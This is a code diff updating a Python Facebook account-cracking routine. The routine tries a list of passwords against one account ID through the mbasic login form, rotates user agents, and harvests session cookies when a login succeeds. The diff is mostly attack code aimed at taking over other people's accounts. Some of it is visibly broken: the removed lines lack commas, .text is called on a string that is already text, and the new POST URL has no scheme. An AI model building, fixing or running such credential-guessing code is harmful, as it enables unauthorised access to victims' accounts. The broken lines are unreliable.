@@ -1179,13 +1179,18 @@ def m5(idf,pwv):
   for ps in pwv:
    session = requests.Session()
    pro = random.choice(ugen)
-   link = session.get(f'https://m.facebook.com').text
-   log_data ={'jazoest': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
-   'lsd': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
-   'email': idf
-   'login_source': 'device_based_login_add_account'
-   'persistent': 
-   'encpass': '#PWD_BROWSER:5:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),ps),}
+   link = session.get(f'https://mbasic.facebook.com').text
+   log_data ={
+    "lsd": re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
+    "jazoest":re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
+    "m_ts": re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
+    "li": re.search('name="li" value="(.*?)"',str(link.text)).group(1),
+    "try_number": "0",
+    "unrecognized_tries": "0",
+    "email": idf,
+    "pass": ps,
+    "login": "Log+in",
+    "bi_xrwh": "0"}
    header_freefb ={
             'authority': 'm.facebook.com',
             'method': 'GET',
@@ -1203,7 +1208,7 @@ def m5(idf,pwv):
             'sec-fetch-site': 'same-origin',
             'upgrade-insecure-requests': '1',
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'} #'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',}
-   lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
+   lo = session.post('mbasic.facebook.com/login/device-based/regular/login/',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
